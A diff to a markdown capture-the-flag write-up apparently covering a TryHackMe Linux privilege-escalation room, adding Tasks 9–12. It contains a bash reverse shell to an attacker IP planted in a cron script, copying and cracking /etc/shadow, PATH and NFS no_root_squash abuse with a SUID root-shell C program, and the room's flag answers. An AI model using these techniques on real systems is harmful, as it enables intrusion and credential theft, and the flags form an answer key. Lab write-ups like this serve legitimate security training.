@@ -247,3 +247,230 @@ cat /home/ubuntu/flag4.txt
 `THM-9349843`
 {% endhint %}
 
+## Task 9 Privilege Escalation: Cron Jobs
+
+```bash
+ssh karen@10.10.129.134
+bash
+```
+
+#### How many user-defined cron jobs can you see on the target system?
+
+```bash
+cat /etc/crontab
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 06-52-00.png>)
+
+{% hint style="success" %}
+`4`
+{% endhint %}
+
+#### What is the content of the flag5.txt file?
+
+```bash
+echo '#!/bin/bash' > backup.sh
+echo 'sh -i >& /dev/tcp/10.6.9.176/4444 0>&1' >> backup.sh
+chmod +x backup.sh
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 06-58-50.png>)
+
+```bash
+nc -nvlp 4444
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+find / -type f -name flag5.txt -exec cat {} \; 2>/dev/null
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-02-20.png>)
+
+{% hint style="success" %}
+`THM-383000283`
+{% endhint %}
+
+#### What is Matt's password?
+
+```bash
+cp /etc/{passwd,shadow} /tmp
+chmod o+r /tmp/shadow
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-07-30.png>)
+
+```bash
+scp karen@10.10.129.234:/tmp/{passwd,shadow} .
+unshadow passwd shadow > crackme
+john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-08-15.png>)
+
+{% hint style="success" %}
+`123456`
+{% endhint %}
+
+## Task 10 Privilege Escalation: PATH
+
+```bash
+ssh karen@10.10.240.172
+bash
+```
+
+#### What is the odd folder you have write access for?
+
+```bash
+find / -type d -writable 2>/dev/null
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-27-02.png>)
+
+{% hint style="success" %}
+`/home/murdoch`
+{% endhint %}
+
+#### Exploit the $PATH vulnerability to read the content of the flag6.txt file.
+
+```bash
+cd /home/murdoch/
+ls -l
+./test
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-30-11.png>)
+
+#### What is the content of the flag6.txt file?
+
+```bash
+cp /bin/bash thm
+PATH=/home/murdoch:$PATH ./test
+find / -type f -name flag6.txt -exec cat {} \; 2>/dev/null
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-33-25.png>)
+
+{% hint style="success" %}
+`THM-736628929`
+{% endhint %}
+
+## Task 11 Privilege Escalation: NFS
+
+```bash
+ssh karen@10.10.15.235
+bash
+```
+
+#### How many mountable shares can you identify on the target system?
+
+```bash
+showmount -e 10.10.15.235
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-47-20.png>)
+
+{% hint style="success" %}
+`3`
+{% endhint %}
+
+#### How many shares have the "no\_root\_squash" option enabled?
+
+```bash
+cat /etc/exports
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-47-30.png>)
+
+{% hint style="success" %}
+`3`
+{% endhint %}
+
+#### Gain a root shell on the target system
+
+```bash
+mkdir /tmp/share
+sudo mount 10.10.15.235:/home/ubuntu/sharedfolder /tmp/share
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-01-23.png>)
+
+```bash
+sudo vim /tmp/share/nfs.c
+sudo gcc -o /tmp/share/nfs /tmp/share/nfs.c
+sudo chmod +s /tmp/share/nfs
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-03-53.png>)
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+#### What is the content of the flag7.txt file?
+
+```bash
+ls -l /home/ubuntu/sharedfolder/
+/home/ubuntu/sharedfolder/nfs
+find / -type f -name flag7.txt -exec cat {} \; 2>/dev/null
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-03-41.png>)
+
+{% hint style="success" %}
+`THM-89384012`
+{% endhint %}
+
+## Task 12 Capstone Challenge
+
+```bash
+ssh leonard@10.10.85.59
+```
+
+#### What is the content of the flag1.txt file?
+
+```bash
+wget http://10.6.9.176/suid3num.py
+python suid3num.py
+base64 /etc/shadow | base64 -d > /tmp/shadow
+base64 /etc/passwd | base64 -d > /tmp/passwd
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-19-34.png>)
+
+```bash
+scp leonard@10.10.85.59:/tmp/{passwd,shadow} .
+unshadow passwd shadow > crackme
+john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-25-06.png>)
+
+```bash
+su - missy
+find / -type f -name flag1.txt 2>/dev/null
+cat /home/missy/Documents/flag1.txt
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-26-13.png>)
+
+{% hint style="success" %}
+`THM-42828719920544`
+{% endhint %}
+
+#### What is the content of the flag2.txt file?
+
+```bash
+sudo -l
+sudo /usr/bin/find / -type f -name flag2.txt -exec cat {} \; 2>/dev/null
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-27-36.png>)
+
+{% hint style="success" %}
+`THM-168824782390238`
+{% endhint %}
